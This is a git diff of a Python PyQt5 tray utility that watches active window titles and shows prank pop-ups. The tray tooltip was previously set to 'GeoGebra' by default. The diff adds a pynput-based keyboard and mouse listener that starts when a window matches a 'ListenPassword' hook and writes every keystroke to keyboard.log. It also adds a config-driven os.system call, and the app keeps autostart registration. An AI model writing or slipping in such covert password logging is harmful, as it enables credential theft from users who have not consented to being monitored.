@@ -1,16 +1,22 @@
-import requests, traceback, sys, path, random, time, json, reg, os, shutil, tempfile
+import requests, traceback, sys, path, random, time, json, reg, os, shutil, tempfile, ctypes
 from PyQt5 import QtCore
 from PyQt5 import Qt
 from PyQt5.QtGui import QIcon
 from PyQt5.QtWidgets import QApplication, QMessageBox, QAction, QMenu, QSystemTrayIcon, QDialog, QMainWindow
-from PyQt5.QtCore import QThread, pyqtSignal
+from PyQt5.QtCore import QThread, pyqtSignal, QTimer
 from ui.Ui_form import Ui_Form
 from ui.Ui_ZBDialog import Ui_ZBDialog
+from ui.Ui_debugForm import Ui_debugForm
 from ui.Ui_password import Ui_PasswordDialog
+from config import Config
+from pynput import keyboard, mouse
 import pygetwindow as gw
 # import qt_material
 
+config = Config()
+
 def checkNetwork(url="https://example.com"):
+    # return True # Debug
     try:
         response = requests.get(url, timeout=5)
         response.raise_for_status()  # 如果响应状态码不是200，将抛出HTTPError异常
@@ -38,11 +44,10 @@ class ZBDialog(QDialog, Ui_ZBDialog):
         self.setFocus()
 
 class PasswordDialog(QDialog, Ui_PasswordDialog):
-    def __init__(self, config, func, parent=None):
+    def __init__(self, func, parent=None):
         super(PasswordDialog, self).__init__(parent)
         self.setupUi(self)
         self.setFixedSize(self.width(), self.height())
-        self.config = config
         self.func = func
         self.label_2.setVisible(False)
         self.passwordInput.setEchoMode(Qt.QLineEdit.Password)
@@ -51,7 +56,7 @@ class PasswordDialog(QDialog, Ui_PasswordDialog):
         self.setWindowIcon(QIcon(path.path("icon.jpg")))
     
     def check(self):
-        if self.passwordInput.text() == self.config.get("password", "ZBZ666"):
+        if self.passwordInput.text() == config.get("Config.Password"):
             self.func()
             self.close()
         else:
@@ -65,6 +70,8 @@ class MyQAction(QAction):
 
 class MyMainWindow(QMainWindow, Ui_Form):
     getGWThreadStatus = False
+    ssTimerFlag = False
+    keyboardThreadStatus = False
 
     def __init__(self,parent =None):
         super(MyMainWindow,self).__init__(parent)
@@ -91,7 +98,7 @@ class MyMainWindow(QMainWindow, Ui_Form):
         self.trayIcon = QSystemTrayIcon(self)
         self.trayIcon.setContextMenu(self.trayIconMenu)
         self.trayIcon.setIcon(self.qIcon)
-        self.trayIcon.setToolTip(self.config.get("ToolTip", "GeoGebra"))
+        self.trayIcon.setToolTip(config.get("Tray.ToolTip"))
         self.trayIcon.show()
     
     def changeTrayIcon(self, icon):
@@ -105,57 +112,119 @@ class MyMainWindow(QMainWindow, Ui_Form):
             QMessageBox.warning(self, "发生错误", "运行发生错误，请将下列错误信息提交给开发者：\n{}".format(str(e)))
 
     def _init(self):
-        with open(path.path("config.json"), "r", encoding="utf-8") as f:
-            self.config = json.loads(f.read())
-
         self._initTray()
 
-        self.autoStartThread = AutoStartThread(self.config)
-        self.autoStartThread.trigger.connect(self.runGWThread)
+        self.autoStartThread = AutoStartThread()
         self.autoStartThread.messager.connect(self.showMessage)
         self.autoStartThread.start()
+        
         self.clearLogsBtn.clicked.connect(self.clearLogs)
         self.titleBtn.clicked.connect(self.runGWThread)
         self.stopGetGWThread.clicked.connect(self.stopGWThread)
         self.enableAutoStart.clicked.connect(self.setAutoStart)
-        self.AutoStartTipLabel.setText(path.cwdPath(self.config.get("EXEFileName", "AntiZTools.exe")))
+        self.AutoStartTipLabel.setText(path.cwdPath(config.get("Config.EXEFileName")))
+
         self.execCode.clicked.connect(self.execCodeFunc)
         self.execCode_2.clicked.connect(self.execCodeThreadFunc)
         self.debugHelpBtn.clicked.connect(self.debugHelp)
+
         self.disableController.clicked.connect(self.disableControllerFunc)
         self.enableController.clicked.connect(self.enableControllerFunc)
-        self.getWindowThread = GetWindowThread(self.config.get("ZBMsg", []))
-        self.getWindowThread.trigger.connect(self.openZBDialog)
-        self.getWindowThread.trigger1.connect(self.stopGWThread)
+
+        self.openDebugForm.clicked.connect(self.openDebugFormFunc)
+        
         self.resetCfg()
         self.saveCfgBtn.clicked.connect(self.saveCfg)
         self.reCfgBtn.clicked.connect(self.resetCfg)
 
-        if self.config.get("StartShow", False):
+        self.getWindowThread = GetWindowThread()
+        self.getWindowThread.execer.connect(self.execInnerFunc)
+        self.getWindowThread.logger.connect(self.log)
+        self.getWindowThread.stopThread.connect(self.stopGWThread)
+        self.runGWThread()
+
+        self.keyboardThread = KeyBoardThread()
+
+        self.log("<p style='color:green;'>Init Success!</p>")
+
+        if int(config.get("ScreenSaver.StartScreenSaverTimer")) != 0:
+            self.ssTimer = QTimer()
+            self.ssTimer.timeout.connect(self.startScreenSaver)
+            self.ssTimer.start(int(config.get("ScreenSaver.StartScreenSaverTimer"))*1000)
+        if config.get("Config.StartShow"):
+            self.log("<i>Show on starting.</i>")
             myWin.show()
-        if self.config.get("startMsg", "已在后台运行") != "":
-            self.showMessage(self.config.get("startMsg", "已在后台运行"))
+        if config.get("Tray.StartMsg") != "":
+            self.log("<i>Show Tray Message.</i>")
+            self.showMessage(config.get("Tray.StartMsg"))
+    
+    def openDebugFormFunc(self):
+        if self.getGWThreadStatus:
+            tt = self.debugFormTitle.text()
+            tt = tt if tt else "debugForm"
+            self.debugForm = DebugForm(tt)
+            self.debugForm.closeBtn.clicked.connect(self.closeDebugForm)
+            self.getWindowThread.debugFormStatus = True
+            self.debugForm.show()
+        else:
+            QMessageBox.warning(self, "调试窗口", "请先启动getGW线程")
+
+    def setDebugForm(self, title):
+        if self.debugForm:
+            self.debugForm.setTitleText(title)
+
+    def closeDebugForm(self):
+        if self.getGWThreadStatus:
+            self.getWindowThread.debugFormStatus = False
+        self.debugForm.close()
+
+    def startScreenSaver(self):
+        try:
+            lit = self.getLastInputTime()
+            self.log("LastInputTime:", lit)
+            if lit >= int(config.get("ScreenSaver.StartScreenSaverLastTime")):
+                if not self.ssTimerFlag:
+                    self.ssTimerFlag = True
+                    self.log("<p style='color:green;'>Starting ScreenSaver</p>")
+                    os.system(config.get("ScreenSaver.ScreenSaverCmd"))
+            else:
+                self.ssTimerFlag = False
+        except Exception as e:
+            self.log("<p style='color:red;'>StartingScreenTimerException:", str(e), "</p>")
+            self.log("<i>Stopping StartingScreenTimer</i>")
+            self.ssTimer.stop()
+
+    def getLastInputTime(self):
+        user32 = ctypes.windll.user32
+        kernel32 = ctypes.windll.kernel32
+
+        class LASTINPUTINFO(ctypes.Structure):
+            _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]
+
+        lii = LASTINPUTINFO()
+        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
+        user32.GetLastInputInfo(ctypes.byref(lii))
+        millis = kernel32.GetTickCount() - lii.dwTime
+        seconds = millis / 1000
+        return seconds
     
     def showMessage(self, msg, *args, **kwargs):
         try:
-            self.trayIcon.showMessage(self.config.get("ToolTip", "GeoGebra"), msg, self.qIcon, *args, **kwargs)
+            self.trayIcon.showMessage(config.get("Tray.ToolTip"), msg, self.qIcon, *args, **kwargs)
         except Exception:
             pass
 
     def saveCfg(self):
         cfg_str = self.CfgTextarea.toPlainText()
         try:
-            with open(path.path("config.json"), "w", encoding="utf-8") as f:
-                f.write(cfg_str)
+            config.data = json.loads(cfg_str)
+            config.save()
             QMessageBox.information(self, "保存成功", "保存成功！\n有些功能重启程序后生效")
         except Exception as e:
             QMessageBox.warning(self, "保存失败", "保存失败！\n{}".format(str(e)))
-        self.config = json.loads(cfg_str)
-        self.autoStartThread.config = self.config
-        self.getWindowThread.config = self.config.get("ZBMsg", [])
     
     def resetCfg(self):
-        self.CfgTextarea.setText(json.dumps(self.config, ensure_ascii=False, indent=4))
+        self.CfgTextarea.setText(json.dumps(config.data, ensure_ascii=False, indent=4))
     
     def debugHelp(self):
         QMessageBox.information(self, "调试指南", """
@@ -186,28 +255,39 @@ class MyMainWindow(QMainWindow, Ui_Form):
 
     def openPwdDialog(self, func):
         def _openPwdDialog():
-            PasswordDialog(self.config, func).exec_()
+            PasswordDialog(func).exec_()
         return _openPwdDialog
 
     def runGWThread(self):
-        if self.config.get("AntiZB", True) and self.getGWThreadStatus == False:
+        if config.get("WindowTitle.Enable") and self.getGWThreadStatus == False:
             self.getWindowThread.exitFlag = False
             self.getWindowThread.start()
             self.getGWThreadStatus = True
-            self.changeTrayIcon(path.path("icon_colored.png"))
             self.getgwstatus.setText("正在运行")
             self.getgwstatus.setStyleSheet("color: green;")
             self.winTitleAction.changeText("正在运行")
-    
+
     def stopGWThread(self):
         try:
-            self.getWindowThread.exitFlag = True
+            self.getWindowThread.forceStop()
             self.getWindowThread.quit()
             self.getGWThreadStatus = False
-            self.changeTrayIcon(path.path("icon.jpg"))
             self.getgwstatus.setText("未运行")
             self.winTitleAction.changeText("未运行")
             self.getgwstatus.setStyleSheet("color: red;")
+        except Exception:
+            pass
+    
+    def runKeyBoardThread(self):
+        if self.keyboardThreadStatus == False:
+            self.keyboardThreadStatus = True
+            self.keyboardThread.start()
+    
+    def stopKeyBoardThread(self):
+        try:
+            self.keyboardThread.forceStop()
+            self.keyboardThread.quit()
+            self.keyboardThreadStatus = False
         except Exception:
             pass
     
@@ -234,7 +314,7 @@ class MyMainWindow(QMainWindow, Ui_Form):
             self.enableController.setDisabled(False)
 
     def setAutoStart(self):
-        autoStarter = reg.AutoStarter(path.cwdPath(self.config.get("EXEFileName", "AntiZTools.exe")), self.config.get("RegAppName", "AntiZTools"))
+        autoStarter = reg.AutoStarter(path.cwdPath(config.get("Config.EXEFileName")), config.get("Config.RegAppName"))
         if not autoStarter.is_auto_start():
             autoStarter.set_auto_start()
         if autoStarter.is_auto_start():
@@ -253,27 +333,36 @@ class MyMainWindow(QMainWindow, Ui_Form):
         self.logTextarea.clear()
     
     def log(self, *args):
+        logStr = ""
         for i in args:
-            self.logTextarea.append(str(i)+" ")
+            logStr += str(i) + " "
+        self.logTextarea.append(logStr)
+
+class DebugForm(QMainWindow, Ui_debugForm):
+    def __init__(self, title, parent=None):
+        super(DebugForm, self).__init__(parent)
+        self.setupUi(self)
+        self.setFixedSize(self.width(), self.height())
+        self.qIcon = QIcon(path.path("icon.jpg"))
+        self.setWindowIcon(self.qIcon)
+        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
+        self.setWindowTitle(title)
+
+    def setTitleText(self, text):
+        self.titletext.setText(text)
+
 
 class AutoStartThread(QThread):
-    trigger = pyqtSignal()
     messager = pyqtSignal(str)
-    emitFlag = True
-    emitFlag2 = True
 
-    def __init__(self, config):
+    def __init__(self):
         super(AutoStartThread, self).__init__()
-        self.config = config
 
     def __del__(self):
         self.wait()
 
     def run(self):
-        self.emitFlag = True
-        self.emitFlag2 = True
-
-        autoStarter = reg.AutoStarter(path.cwdPath(self.config.get("EXEFileName", "AntiZTools.exe")), self.config.get("RegAppName", "AntiZTools"))
+        autoStarter = reg.AutoStarter(path.cwdPath(config.get("Config.EXEFileName")), config.get("Config.RegAppName"))
         if autoStarter.is_auto_start():
             myWin.AutoStartLabel.setText("已启用")
             myWin.AutoStartLabel.setStyleSheet("color: green")
@@ -296,14 +385,10 @@ class AutoStartThread(QThread):
             myWin.enableController.setDisabled(True)
             myWin.conStatusAction.changeText("未禁用")
         
-        print("getStatus...")
-        if checkNetwork(url=self.config.get("checkUrl", "https://example.com")):
-            self.trigger.emit()
-        
         temp_dir = tempfile.gettempdir()
         failedtimes, successtimes, cleantipstr = 0, 0, ""
         for item in os.listdir(temp_dir):
-            if item.startswith(self.config.get("TempFilePrefix", "_MEI")):
+            if item.startswith(config.get("TempFileClear.TempFilePrefix")):
                 try:
                     print("Delete Temp:", item)
                     shutil.rmtree(os.path.join(temp_dir, item))
@@ -311,46 +396,133 @@ class AutoStartThread(QThread):
                 except Exception as e:
                     failedtimes += 1
                     print(e)
-        if failedtimes >= int(self.config.get("cleanFailedTimes", 2)):
+        if failedtimes >= int(config.get("TempFileClear.CleanFailedTimes")):
             cleantipstr = "。\n失败数量过多，请引起注意！"
         self.messager.emit(f"临时文件清理完毕，成功{successtimes}个，失败{failedtimes}个{cleantipstr}")
 
-class GetWindowThread(QThread):
-    flag = False
-    exitFlag = False
-    trigger = pyqtSignal(str, int, int)
-    trigger1 = pyqtSignal()
-    times = 0
+class KeyBoardThread(QThread):
+    enterFlag = False
 
-    def __init__(self, config):
+    def __init__(self):
+        super(KeyBoardThread, self).__init__()
+    
+    def forceStop(self):
+        try:
+            self.file.close()
+            self.keyboardListener.stop()
+            self.mouseListener.stop()
+        except Exception:
+            del self.keyboardListener
+            del self.mouseListener
+    
+    def on_press(self, key):
+        try:
+            char = key.char
+            if char:
+                print(f"{char} Pressed.")
+                self.file.write(char)
+        except AttributeError:
+            print(f"{key} Pressed.")
+            self.file.write(f"[{str(key).replace('Key.', '')}]")
+        if not self.enterFlag:
+            self.enterFlag = True
+    
+    def on_mouse(self, x, y, dx=None, dy=None):
+        print("Mouse move", x, y, dx, dy)
+        if self.enterFlag:
+            self.file.write("\n")
+            self.enterFlag = False
+
+    def run(self):
+        self.file = open(path.path("keyboard.log"), "a+", encoding="utf-8")
+        now = time.localtime()
+        time_str = time.strftime("%Y-%m-%d %H:%M:%S", now)
+        self.file.write(f"\n\n({time_str}):\n")
+
+        self.mouseListener = mouse.Listener(
+            on_move=self.on_mouse,
+            on_click=self.on_mouse,
+            on_scroll=self.on_mouse)
+        self.mouseListener.start()
+
+        self.keyboardListener = keyboard.Listener(
+                on_press=self.on_press)
+        self.keyboardListener.start()
+        self.keyboardListener.join()
+        self.keyboardListener.stop()
+        self.mouseListener.stop()
+
+class GetWindowThread(QThread):
+    exitFlag = False
+    execer = pyqtSignal(str, tuple)
+    logger = pyqtSignal(str)
+    stopThread = pyqtSignal()
+    ZBDialogFlag = True
+    PasswordFlag = False
+    debugFormStatus = False
+
+    def __init__(self):
         super(GetWindowThread, self).__init__()
         self.desktop = QApplication.desktop()
-        self.config = config
-
-    def __del__(self):
-        self.wait()
+    
+    def forceStop(self):
+        self.exitFlag = True
     
     def run(self):
+        if checkNetwork(url=config.get("Config.CheckUrl")):
+            # 状态异常
+            self.ZBDialogFlag = False
+            self.execer.emit("changeTrayIcon", (path.path("icon_colored.png"),))
+            self.logger.emit("Started ZBDialog Listener.")
+
+        _oldTitle = None
         while True:
             try:
-                title = gw.getActiveWindowTitle()
-                print("Active Window Title:", title)
-                for i in self.config:
-                    if (i.get("title") == title) or (i.get("fuzzyMatching") and i.get("title") in title):
-                        for _ in range(i.get("times", 5)):
-                            self.trigger.emit(
-                                random.choice(i.get("msg", ["检测到有人在装逼，我不说是谁", "震惊，六班竟然突破了科技封锁", "原神哥真的是太有实力啦"])),
-                                self.desktop.width(),
-                                self.desktop.height()
-                            )
-                            time.sleep(0.4)
-                        self.exitFlag = True
                 if self.exitFlag:
                     break
+                title = gw.getActiveWindowTitle()
+                matchFlag = False
+                if _oldTitle != title and self.debugFormStatus:
+                    self.execer.emit("setDebugForm", (title,))
+                    _oldTitle = title
+                for i in config.get("WindowTitle.hook"):
+                    if (i.get("title") == title) or (i.get("fuzzyMatching") and i.get("title") in title):
+                        matchFlag = True
+                        if i.get("handler") == "ZBDialog":
+                            if not self.ZBDialogFlag:
+                                self.logger.emit("Stopped ZBDialog Listener.")
+                                self.openZBDialog(i.get("data", {}))
+                                self.execer.emit("changeTrayIcon", (path.path("icon.jpg"),))
+                                self.ZBDialogFlag = True
+                        elif i.get("handler") == "ListenPassword":
+                            if not self.PasswordFlag:
+                                self.PasswordFlag = True
+                                # Start catch keyboard input thread
+                                self.execer.emit("runKeyBoardThread", ())
+                                self.logger.emit("Started KeyBoard Listener.")
+                if not matchFlag:
+                    if self.PasswordFlag:
+                        self.PasswordFlag = False
+                        # Stop catch keyboard input thread
+                        self.execer.emit("stopKeyBoardThread", ())
+                        self.logger.emit("Stopped KeyBoard Listener.")
             except Exception as e:
                 print(e)
-            time.sleep(1)
-        self.trigger1.emit()
+            time.sleep(int(config.get("WindowTitle.Interval")))
+        self.stopThread.emit()
+        self.debugFormStatus = False
+    
+    def openZBDialog(self, i):
+        for _ in range(i.get("times", 5)):
+            self.execer.emit(
+                "openZBDialog",
+                (
+                    random.choice(i.get("msg", ["检测到有人在装逼，我不说是谁", "震惊，六班竟然突破了科技封锁", "原神哥真的是太有实力啦"])),
+                    self.desktop.width(),
+                    self.desktop.height(),
+                )
+            )
+            time.sleep(0.4)
 
 class RunCodeThread(QThread):
     logger = pyqtSignal(str)
